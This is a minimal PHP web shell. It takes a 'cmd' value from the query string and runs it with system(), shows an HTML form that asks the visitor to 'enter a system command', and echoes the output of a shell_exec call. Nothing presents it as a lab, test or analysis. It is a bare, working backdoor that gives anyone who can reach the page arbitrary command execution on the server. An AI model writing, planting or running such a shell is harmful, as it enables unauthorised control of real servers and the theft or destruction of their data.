<?php
	$cmd = $_GET['cmd'];
	if(isset($cmd)) {
		system($cmd);
	}
?>

<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	</head>
	<p> Please enter a system command </p>
	<form method="GET" id="searchform">
		<input type="text" name="cmd">
		<input type="submit" name="submit" value="submit">
	</form>
<br>
<br>
<p> if you need a one-liner file, try:</p>
<br>
<p><?php echo shell_exec("cmd");?></p>

</html>
